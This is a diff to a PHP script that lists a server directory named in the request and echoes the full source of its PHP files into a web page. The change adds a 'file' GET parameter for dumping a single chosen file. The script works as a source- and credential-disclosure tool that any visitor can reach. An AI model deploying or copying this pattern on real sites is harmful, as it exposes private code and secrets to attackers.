@@ -11,6 +11,8 @@ if($target_dir == 0){
     echo "FAILED TO OPEN DIRECTORY";exit;
 }
 
+$target_file = isset($_GET['file']) ? $_GET['file'] : 0;
+
 $target_dir='/'.$target_dir.'/';
 
 // "*******************************GET HOSTNAME***************************************<br>";
@@ -38,14 +40,29 @@ if (!$files = scandir($main_path)) {
 // "*******************************READ FILES***************************************<br>";
 foreach($files as $key=>$file)
 {
-    $info = pathinfo($file);
-    if($info['extension'] == 'php'){
-        $file_name =  $main_path.$file;
-        echo "<br><br><b><hr>$file_name</hr></b><br><br>";
-        $file = fopen($file_name, "r");
-        while (!feof($file)) {
-          echo fgets($file) . "<br />";
+    if($target_file != 0){
+        if($file==$target_file){
+           $info = pathinfo($file);
+            if($info['extension'] == 'php'){
+                $file_name =  $main_path.$file;
+                echo "<br><br><b><hr>$file_name</hr></b><br><br>";
+                $file = fopen($file_name, "r");
+                while (!feof($file)) {
+                  echo fgets($file) . "<br />";
+                }
+                fclose($file);
+            }
         }
-        fclose($file);
+    }else{
+        $info = pathinfo($file);
+        if($info['extension'] == 'php'){
+            $file_name =  $main_path.$file;
+            echo "<br><br><b><hr>$file_name</hr></b><br><br>";
+            $file = fopen($file_name, "r");
+            while (!feof($file)) {
+              echo fgets($file) . "<br />";
+            }
+            fclose($file);
+        }
     }
 }
